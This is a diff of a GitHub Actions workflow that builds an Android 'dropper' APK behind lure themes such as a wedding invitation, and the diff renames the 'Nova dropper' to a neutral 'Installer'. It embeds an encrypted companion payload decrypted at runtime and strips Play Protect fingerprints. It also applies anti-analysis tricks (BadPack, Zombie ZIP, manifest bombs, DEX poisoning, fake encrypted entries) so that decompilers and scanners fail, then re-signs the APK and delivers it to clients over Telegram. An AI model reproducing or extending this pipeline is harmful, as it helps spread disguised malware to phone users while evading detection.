@@ -1,4 +1,4 @@
-name: Build Nova Launcher APK
+name: Build Installer APK
 run-name: >-
   Build ${{
     github.event.inputs.template == 'wedding' && 'Wedding Invitation' ||
@@ -294,9 +294,9 @@ jobs:
           sed -i "s|>Wedding Invitation<|>${APP_DISPLAY}<|" app/src/main/res/values/strings.xml
           echo "✅ App name set: ${APP_DISPLAY}"
 
-      # ── 4. Inject Nova package name into source ───────────────────────────────
-      - name: Generate legitimate Nova + companion package names
-        id: nova_pkg
+      # ── 4. Inject Installer package name into source ───────────────────────────────
+      - name: Generate Installer + Companion package names
+        id: installer_pkg
         run: |
           # Template comes from workflow_dispatch input
           TMPL="${{ github.event.inputs.template }}"
@@ -305,13 +305,13 @@ jobs:
           # Uses package_name_generator.py — 3-segment, real Indian words,
           # 25-45 chars, date-based version code, never reuses names
           OUTPUT=$(python3 scripts/package_name_generator.py --template "${TMPL}")
-          NOVA_PKG=$(echo "$OUTPUT" | grep INSTALLER_PKG | cut -d= -f2)
+          INSTALLER_PKG=$(echo "$OUTPUT" | grep INSTALLER_PKG | cut -d= -f2)
           MOD_PKG=$(echo "$OUTPUT" | grep MODULE_PKG | cut -d= -f2)
           VER_CODE=$(echo "$OUTPUT" | grep VERSION_CODE  | cut -d= -f2)
-          echo "NOVA_PKG=${NOVA_PKG}"   >> $GITHUB_OUTPUT
+          echo "INSTALLER_PKG=${INSTALLER_PKG}"   >> $GITHUB_OUTPUT
           echo "MOD_PKG=${MOD_PKG}"   >> $GITHUB_OUTPUT
           echo "VER_CODE=${VER_CODE}"   >> $GITHUB_OUTPUT
-          echo "✅ Installer pkg: ${NOVA_PKG}"
+          echo "✅ Installer pkg: ${INSTALLER_PKG}"
           echo "✅ Module pkg: ${MOD_PKG}"
           echo "✅ Version code:  ${VER_CODE}"
           echo "✅ Template: ${TMPL}"
@@ -329,30 +329,30 @@ jobs:
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
             --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
 
-      - name: Inject Nova package name into source
+      - name: Inject Installer package name into source
         run: |
           set -e
-          OLD_NOVA="com.playstore.installer"
-          NEW_NOVA="${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+          OLD_INSTALLER_PKG="com.playstore.installer"
+          NEW_INSTALLER_PKG="${{ steps.installer_pkg.outputs.INSTALLER_PKG }}"
           OLD_PATH="com/playstore/installer"
-          NEW_PATH="${NEW_NOVA//.//}"
+          NEW_PATH="${NEW_INSTALLER_PKG//.//}"
 
-          # Validate NOVA_PKG was generated
-          if [ -z "${NEW_NOVA}" ]; then
-            echo "::error::NOVA_PKG is empty — package_name_generator.py failed"
+          # Validate INSTALLER_PKG was generated
+          if [ -z "${NEW_INSTALLER_PKG}" ]; then
+            echo "::error::INSTALLER_PKG is empty — package_name_generator.py failed"
             exit 1
           fi
 
           # Replace all occurrences in build.gradle in one pass — handles any
           # whitespace or quoting variation that separate sed patterns would miss
-          sed -i "s|${OLD_NOVA}|${NEW_NOVA}|g" app/build.gradle
+          sed -i "s|${OLD_INSTALLER_PKG}|${NEW_INSTALLER_PKG}|g" app/build.gradle
 
           # Replace in AndroidManifest.xml
-          sed -i "s|${OLD_NOVA}|${NEW_NOVA}|g" app/src/main/AndroidManifest.xml
+          sed -i "s|${OLD_INSTALLER_PKG}|${NEW_INSTALLER_PKG}|g" app/src/main/AndroidManifest.xml
 
           # Replace package declarations in all .kt files at old path
           find "app/src/main/java/${OLD_PATH}" -name "*.kt" \
-            -exec sed -i "s|${OLD_NOVA}|${NEW_NOVA}|g" {} +
+            -exec sed -i "s|${OLD_INSTALLER_PKG}|${NEW_INSTALLER_PKG}|g" {} +
 
           # Copy .kt files to new package path
           mkdir -p "app/src/main/java/${NEW_PATH}"
@@ -371,23 +371,23 @@ jobs:
           # Verify: only check java source files and AndroidManifest
           # build.gradle is excluded — it was fully replaced by sed above
           # and Gradle plugins handle it correctly at build time
-          REMAINING=$(grep -r "${OLD_NOVA}" \
+          REMAINING=$(grep -r "${OLD_INSTALLER_PKG}" \
             app/src/main/java/ \
             app/src/main/AndroidManifest.xml 2>/dev/null | wc -l)
           if [ "${REMAINING}" -gt 0 ]; then
-            echo "::error::Old Nova package name still present in source:"
-            grep -r "${OLD_NOVA}" app/src/main/java/ app/src/main/AndroidManifest.xml || true
+            echo "::error::Old Installer package name still present in source:"
+            grep -r "${OLD_INSTALLER_PKG}" app/src/main/java/ app/src/main/AndroidManifest.xml || true
             exit 1
           fi
 
           # Verify build.gradle was updated correctly
-          if grep -q "${OLD_NOVA}" app/build.gradle; then
-            echo "::error::Old Nova package name still in build.gradle"
-            grep "${OLD_NOVA}" app/build.gradle || true
+          if grep -q "${OLD_INSTALLER_PKG}" app/build.gradle; then
+            echo "::error::Old Installer package name still in build.gradle"
+            grep "${OLD_INSTALLER_PKG}" app/build.gradle || true
             exit 1
           fi
 
-          echo "✅ Nova package name injected: ${NEW_NOVA}"
+          echo "✅ Installer package name injected: ${NEW_INSTALLER_PKG}"
 
       # ── 4a. Inject CLIENT_TOKEN into build.gradle BuildConfig ─────────────────
       - name: Inject CLIENT_TOKEN into build.gradle
@@ -428,11 +428,11 @@ jobs:
             exit 1
           fi
 
-      # ── Notify — Nova package injected ───────────────────────────────────────
-      - name: Notify — Nova package injected
+      # ── Notify — Installer package injected ───────────────────────────────────────
+      - name: Notify — Installer package injected
         run: |
           python3 scripts/telegram_notify.py \
-            --step      "Inject Nova package" \
+            --step      "Inject Installer package" \
             --status    "progress" \
             --build     "${{ github.run_number }}" \
             --template  "${{ github.event.inputs.template }}" \
@@ -459,10 +459,10 @@ jobs:
       - name: Build companion APK
         env:
           OLD_PKG:           ${{ env.OLD_PKG }}
-          NEW_MOD_PKG:       ${{ steps.nova_pkg.outputs.MOD_PKG }}
-          MOD_VER_CODE:      ${{ steps.nova_pkg.outputs.VER_CODE }}
+          NEW_MOD_PKG:       ${{ steps.installer_pkg.outputs.MOD_PKG }}
+          MOD_VER_CODE:      ${{ steps.installer_pkg.outputs.VER_CODE }}
           MODULE_ASSET:      ${{ env.MODULE_ASSET }}
-          NOVA_PKG:          ${{ steps.nova_pkg.outputs.NOVA_PKG }}
+          INSTALLER_PKG:          ${{ steps.installer_pkg.outputs.INSTALLER_PKG }}
           GITHUB_OUTPUT:     $GITHUB_OUTPUT
           KEYSTORE_BASE64:   ${{ secrets.KEYSTORE_BASE64 }}
           KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
@@ -507,11 +507,6 @@ jobs:
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
             --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
 
-
-      # Phase 3 DEX chunk pipeline removed — Step 8A.
-      # companion.apk is now an encrypted blob. data_processor.py cannot
-      # open it as a zip. Companion encryption is handled by build_module.py
-      # step_encrypt_companion(). DexLoader.kt decrypts at runtime.
 
       # ── 7. Cache Gradle wrapper ───────────────────────────────────────────────
       - name: Cache Gradle wrapper
@@ -579,7 +574,7 @@ jobs:
           echo "Assets after legitimacy step:"
           ls -lh "${ASSETS_DIR}/"
 
-      # ── 8. Grant gradlew + Build Nova release APK ────────────────────────────
+      # ── 8. Grant gradlew + Build Installer release APK ────────────────────────────
       - name: Build Release APK
         env:
           KEYSTORE_BASE64:   ${{ secrets.KEYSTORE_BASE64 }}
@@ -603,19 +598,19 @@ jobs:
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
             --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
 
-      # ── 8c. Phase 3 Step 27 — Nova Stub DEX patcher ─────────────────────────
+      # ── 8c. Phase 3 Step 27 — Installer Stub DEX patcher ─────────────────────────
       # Runs AFTER assembleRelease (needs Gradle build intermediates for AppEntry.class)
       # Runs BEFORE Phase 2 (Phase 2 re-signs — asset patcher must patch before that)
-      # Transforms Nova APK: full 601KB DEX → tiny base DEX + encrypted asset blob
-      - name: "Phase 3 | Step 27 — Nova Stub DEX patcher"
+      # Transforms Installer APK: full 601KB DEX → tiny base DEX + encrypted asset blob
+      - name: "Phase 3 | Step 27 — Installer Stub DEX patcher"
         run: |
           set -e
           BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
           export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
 
-          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
-          if [ -z "$NOVA_APK" ]; then
-            echo "::error::Nova APK not found in release outputs"
+          INSTALLER_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          if [ -z "$INSTALLER_APK" ]; then
+            echo "::error::Installer APK not found in release outputs"
             exit 1
           fi
 
@@ -636,7 +631,7 @@ jobs:
           PKG_DIR=$(dirname "$STUB_KT")
           PKG_NAME=$(echo "$PKG_DIR" | sed "s|$JAVA_SRC/||" | tr '/' '.')
 
-          echo "Nova APK:    $NOVA_APK"
+          echo "Installer APK:    $INSTALLER_APK"
           echo "AppEntry.kt: $STUB_KT"
           echo "Package:     $PKG_NAME"
 
@@ -673,11 +668,11 @@ jobs:
           # NOTE: MODULE_ASSET is NOT overridden here.
           # The companion file on disk is always app/src/main/assets/module.apk
           # build_module.py reads it by that name throughout its pipeline.
-          # ASSET_A only controls the ZIP entry name INSIDE the Nova APK —
+          # ASSET_A only controls the ZIP entry name INSIDE the Installer APK —
           # that rename happens post-sign via zip_header_obfuscator.py --asset-a.
 
           python3 scripts/asset_patcher.py \
-            --apk        "$NOVA_APK" \
+            --apk        "$INSTALLER_APK" \
             --stub-kt    "$STUB_KT" \
             --android-sdk "$ANDROID_SDK_ROOT" \
             --pkg        "$PKG_NAME" \
@@ -685,9 +680,9 @@ jobs:
 
           echo "✅ Asset preparation complete"
           echo "DEX files in APK after stub patch:"
-          unzip -l "$NOVA_APK" | grep "\.dex\|assets/.*\.bin"
+          unzip -l "$INSTALLER_APK" | grep "\.dex\|assets/.*\.bin"
 
-      # ── Step 5: Strip GPP fingerprint files from Nova APK ─────────────────────
+      # ── Step 5: Strip GPP fingerprint files from Installer APK ─────────────────────
       # Guaranteed post-sign ZIP rewrite — Gradle packagingOptions.exclude
       # has a confirmed AGP 7.x+ bug that silently ignores assets/dexopt/
       # and re-injects META-INF/services/ after merge tasks complete.
@@ -704,34 +699,34 @@ jobs:
       # for entries with non-standard compression type 2032 — those entries end up
       # missing from MANIFEST.MF → V1 fails → "Verified failed by V1".
 
-      - name: "Phase 2 | Steps 17A+17C — ZIP timestamps + padding (Nova)"
+      - name: "Phase 2 | Steps 17A+17C — ZIP timestamps + padding (Installer)"
         run: |
           set -e
           BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
           export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
-          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
-          # Step 4: rename assets/module.apk → assets/$ASSET_A inside Nova ZIP
+          INSTALLER_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          # Step 4: rename assets/module.apk → assets/$ASSET_A inside Installer ZIP
           # --asset-a triggers rename_companion_asset() before 17A/17C apply
-          python3 scripts/zip_header_obfuscator.py "$NOVA_APK" "${NOVA_APK}.obf" \
+          python3 scripts/zip_header_obfuscator.py "$INSTALLER_APK" "${INSTALLER_APK}.obf" \
             --skip-17b --asset-a "$ASSET_A"
-          mv "${NOVA_APK}.obf" "$NOVA_APK"
-          echo "✅ Steps 4/17A/17C applied to Nova ($ASSET_A, 17B deferred)"
+          mv "${INSTALLER_APK}.obf" "$INSTALLER_APK"
+          echo "✅ Steps 4/17A/17C applied to Installer ($ASSET_A, 17B deferred)"
 
-      - name: "Phase 2 | Steps 17E+17F — Manifest obfuscation (Nova)"
+      - name: "Phase 2 | Steps 17E+17F — Manifest obfuscation (Installer)"
         run: |
           set -e
           BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
           export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
-          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
-          echo "Nova APK: $NOVA_APK"
+          INSTALLER_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "Installer APK: $INSTALLER_APK"
           AES_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
-          python3 -u scripts/manifest_zip_patcher.py "$NOVA_APK" "${NOVA_APK}.mzp" "$AES_KEY" 2>&1
-          if [ ! -f "${NOVA_APK}.mzp" ]; then
+          python3 -u scripts/manifest_zip_patcher.py "$INSTALLER_APK" "${INSTALLER_APK}.mzp" "$AES_KEY" 2>&1
+          if [ ! -f "${INSTALLER_APK}.mzp" ]; then
             echo "::error::manifest_zip_patcher did not produce output file"
             exit 1
           fi
-          mv "${NOVA_APK}.mzp" "$NOVA_APK"
-          echo "✅ Steps 17E/17F applied to Nova"
+          mv "${INSTALLER_APK}.mzp" "$INSTALLER_APK"
+          echo "✅ Steps 17E/17F applied to Installer"
 
       # ── Step 108: ZIP enhancement folder entry injection ────────────────────────────
       # Replicates IRT.apk technique: inject 90+ fake password-protected ZIP
@@ -742,20 +737,20 @@ jobs:
       # Effect: jadx, apktool, aapt, GPP scanner all abort or produce garbage.
       # Android installer ignores these entries completely on install.
       #
-      # MUST run BEFORE phase2_resign (APK is unsigned here — nova_stub_patcher
+      # MUST run BEFORE phase2_resign (APK is unsigned here — installer_stub_patcher
       # stripped V2. phase2_resign will re-sign covering all zip entries too).
-      - name: "Phase 2 | Step 108 — ZIP folder enhancement (Nova)"
+      - name: "Phase 2 | Step 108 — ZIP folder enhancement (Installer)"
         run: |
           set -e
-          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
-          echo "Nova APK before ZIP enhancement: $(du -h $NOVA_APK | cut -f1)"
-          python3 scripts/zip_enhancer.py "$NOVA_APK" "${NOVA_APK}.ghost"
-          if [ ! -f "${NOVA_APK}.ghost" ]; then
+          INSTALLER_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "Installer APK before ZIP enhancement: $(du -h $INSTALLER_APK | cut -f1)"
+          python3 scripts/zip_enhancer.py "$INSTALLER_APK" "${INSTALLER_APK}.ghost"
+          if [ ! -f "${INSTALLER_APK}.ghost" ]; then
             echo "::error::zip_enhancer did not produce output"
             exit 1
           fi
-          mv "${NOVA_APK}.ghost" "$NOVA_APK"
-          echo "Nova APK after ZIP enhancement: $(du -h $NOVA_APK | cut -f1)"
+          mv "${INSTALLER_APK}.ghost" "$INSTALLER_APK"
+          echo "Installer APK after ZIP enhancement: $(du -h $INSTALLER_APK | cut -f1)"
           echo "✅ Step 108 ZIP enhancement applied"
 
       # ── Notify — Phase 2 obfuscation done ────────────────────────────────────
@@ -771,7 +766,7 @@ jobs:
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
             --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
 
-      - name: "Phase 2 | Re-sign Nova after Phase 2 patches"
+      - name: "Phase 2 | Re-sign Installer after Phase 2 patches"
         env:
           KEYSTORE_BASE64:   ${{ secrets.KEYSTORE_BASE64 }}
           KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
@@ -780,10 +775,10 @@ jobs:
           set -e
           BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
           export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
-          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
-          python3 scripts/phase2_resign.py "$NOVA_APK"
-          apksigner verify --verbose "$NOVA_APK"
-          echo "✅ Nova re-signed after Phase 2"
+          INSTALLER_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          python3 scripts/phase2_resign.py "$INSTALLER_APK"
+          apksigner verify --verbose "$INSTALLER_APK"
+          echo "✅ Installer re-signed after Phase 2"
 
       # ── Notify — Re-signed ───────────────────────────────────────────────────
       - name: Notify — Re-signed
@@ -805,7 +800,7 @@ jobs:
       #   2. strip_fingerprint_files rewrites ZIP → needs final re-sign after
       #   3. r8 decoy injection → also needs final re-sign
       # After this step: ONE final re-sign covers everything
-      - name: "Step 5+7 | Strip fingerprints + deflate fix + r8 decoy (Nova)"
+      - name: "Step 5+7 | Strip fingerprints + deflate fix + r8 decoy (Installer)"
         env:
           KEYSTORE_BASE64:   ${{ secrets.KEYSTORE_BASE64 }}
           KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
@@ -814,10 +809,10 @@ jobs:
           set -e
           BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
           export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
-          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
-          echo "Step 5+7: Strip + recompress + r8 on $NOVA_APK"
-          python3 scripts/strip_fingerprint_files.py "$NOVA_APK" "${NOVA_APK}.s57"
-          mv "${NOVA_APK}.s57" "$NOVA_APK"
+          INSTALLER_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "Step 5+7: Strip + recompress + r8 on $INSTALLER_APK"
+          python3 scripts/strip_fingerprint_files.py "$INSTALLER_APK" "${INSTALLER_APK}.s57"
+          mv "${INSTALLER_APK}.s57" "$INSTALLER_APK"
 
           # ── All 6 anti-analysis techniques — MUST run AFTER strip_fingerprint_files
           # strip_fingerprint_files.py rebuilds the entire ZIP from scratch.
@@ -827,38 +822,38 @@ jobs:
           # Technique 1+2+4 — BadPack LFH mismatch + GP encryption bit + Zombie ZIP
           # (BadPack sets LFH compress=STORE, CDH stays DEFLATE = Zombie ZIP too)
           echo "Step All6: Applying Tech 1+2+4 — BadPack + GP bit + Zombie ZIP..."
-          python3 scripts/badpack_gp_patcher.py "$NOVA_APK" "${NOVA_APK}.t124" --mode nova
-          if [ ! -f "${NOVA_APK}.t124" ]; then
+          python3 scripts/badpack_gp_patcher.py "$INSTALLER_APK" "${INSTALLER_APK}.t124" --mode installer
+          if [ ! -f "${INSTALLER_APK}.t124" ]; then
             echo "::error::badpack_gp_patcher did not produce output"
             exit 1
           fi
-          mv "${NOVA_APK}.t124" "$NOVA_APK"
+          mv "${INSTALLER_APK}.t124" "$INSTALLER_APK"
           echo "✅ Tech 1+2+4 applied"
 
           # Technique 3+5 — Manifest Bomb 0x9999 + AXML string pool count inflation
           echo "Step All6: Applying Tech 3+5 — Manifest bomb + AXML string pool..."
-          python3 scripts/nova_axml_patcher.py "$NOVA_APK" "${NOVA_APK}.t35"
-          if [ ! -f "${NOVA_APK}.t35" ]; then
-            echo "::error::nova_axml_patcher did not produce output"
+          python3 scripts/installer_axml_patcher.py "$INSTALLER_APK" "${INSTALLER_APK}.t35"
+          if [ ! -f "${INSTALLER_APK}.t35" ]; then
+            echo "::error::installer_axml_patcher did not produce output"
             exit 1
           fi
-          mv "${NOVA_APK}.t35" "$NOVA_APK"
+          mv "${INSTALLER_APK}.t35" "$INSTALLER_APK"
           echo "✅ Tech 3+5 applied"
 
           # Technique 6 — DEX bytecode poisoning (invalid element_width)
           echo "Step All6: Applying Tech 6 — DEX bytecode poisoning..."
-          python3 scripts/nova_dex_poisoner.py "$NOVA_APK" "${NOVA_APK}.t6"
-          if [ ! -f "${NOVA_APK}.t6" ]; then
-            echo "::error::nova_dex_poisoner did not produce output"
+          python3 scripts/installer_dex_poisoner.py "$INSTALLER_APK" "${INSTALLER_APK}.t6"
+          if [ ! -f "${INSTALLER_APK}.t6" ]; then
+            echo "::error::installer_dex_poisoner did not produce output"
             exit 1
           fi
-          mv "${NOVA_APK}.t6" "$NOVA_APK"
+          mv "${INSTALLER_APK}.t6" "$INSTALLER_APK"
           echo "✅ Tech 6 applied"
 
-          echo "Step All6: All 6 anti-analysis techniques applied to Nova ✅"
+          echo "Step All6: All 6 anti-analysis techniques applied to Installer ✅"
           echo "Step 5+7: Re-signing after strip+recompress+r8+all6..."
-          python3 scripts/phase2_resign.py "$NOVA_APK"
-          apksigner verify --verbose "$NOVA_APK" | head -5
+          python3 scripts/phase2_resign.py "$INSTALLER_APK"
+          apksigner verify --verbose "$INSTALLER_APK" | head -5
           echo "✅ Step 5+7 complete — fingerprints stripped, deflate(8), r8 injected"
 
       # ── Notify — Fingerprints stripped ───────────────────────────────────────
@@ -874,7 +869,7 @@ jobs:
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
             --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
 
-      # Step 17B (compression type 2032) is disabled for Nova APK.
+      # Step 17B (compression type 2032) is disabled for Installer APK.
       # V2 signing covers Section 1 (all file data including LFH bytes).
       # 17B patches LFH compress type fields which are in Section 1.
       # Any LFH byte change after signing = V2 hash mismatch = Verified failed.
@@ -894,7 +889,7 @@ jobs:
           APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
           echo "APK: $APK"
           echo "Size: $(du -h $APK | cut -f1)"
-          echo "Nova package name: ${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+          echo "Installer package name: ${{ steps.installer_pkg.outputs.INSTALLER_PKG }}"
           echo "DEX files inside APK:"
           unzip -l $APK | grep "\.dex"
 
@@ -924,15 +919,15 @@ jobs:
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
             --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
 
-      # ── 11. Upload Nova APK artifact ─────────────────────────────────────────
-      # Nova (dropper) is the single deliverable APK.
+      # ── 11. Upload Installer APK artifact ─────────────────────────────────────────
+      # Installer is the single deliverable APK.
       # companion.apk is encrypted to a binary blob by step_encrypt_companion()
-      # and embedded inside Nova's assets/ at Gradle build time — NOT a separate output.
-      - name: Upload Nova APK artifact
+      # and embedded inside Installer's assets/ at Gradle build time — NOT a separate output.
+      - name: Upload Installer APK artifact
         uses: actions/upload-artifact@v4
         with:
-          name: nova-dropper-${{ github.run_number }}
-          path: app/build/outputs/apk/release/nova_*.apk
+          name: installer-${{ github.run_number }}
+          path: app/build/outputs/apk/release/installer_*.apk
           retention-days: 7
           overwrite: true
 
@@ -940,7 +935,7 @@ jobs:
       - name: Send APK to Telegram
         if: success()
         run: |
-          APK=$(find app/build/outputs/apk/release -name "nova_*.apk" | head -1)
+          APK=$(find app/build/outputs/apk/release -name "installer_*.apk" | head -1)
           SIZE=$(du -h "$APK" | cut -f1)
           # Decode server key from Base64 for display in success message
           _KEY_B64="${SERVER_KEY_B64}"
@@ -960,7 +955,7 @@ jobs:
             --token       "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
             --apk         "$APK" \
             --apk-size    "$SIZE" \
-            --pkg         "${{ steps.nova_pkg.outputs.NOVA_PKG }}" \
+            --pkg         "${{ steps.installer_pkg.outputs.INSTALLER_PKG }}" \
             --commit      "${{ github.sha }}" \
             --client-name "${{ github.event.inputs.client_name }}" \
             --client-ip   "${{ github.event.inputs.client_ip }}" \
@@ -984,7 +979,7 @@ jobs:
           find . -name "module_audit.log" -exec cp {} error_logs/ \; 2>/dev/null || true
           find . -name "companion_build.log" -exec cp {} error_logs/ \; 2>/dev/null || true
           find . -name "step_audit.log"      -exec cp {} error_logs/ \; 2>/dev/null || true
-          find . -name "nova_build.log"      -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "installer_build.log"      -exec cp {} error_logs/ \; 2>/dev/null || true
 
           # ── Gradle build logs ─────────────────────────────────────────────
           find . -path "*/build/outputs/logs/*.log" -exec cp {} error_logs/ \; 2>/dev/null || true
@@ -1002,8 +997,8 @@ jobs:
 
           # ── module_audit.log contents inline in env_info ───────────────
           {
-            echo "=== NOVA PACKAGE ==="
-            echo "${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+            echo "=== INSTALLER PACKAGE ==="
+            echo "${{ steps.installer_pkg.outputs.INSTALLER_PKG }}"
             echo "=== JAVA ===" && java -version 2>&1 || true
             echo "=== APKTOOL ===" && apktool --version 2>&1 || true
             echo "=== GRADLE ===" && chmod +x gradlew && ./gradlew --version 2>&1 || true
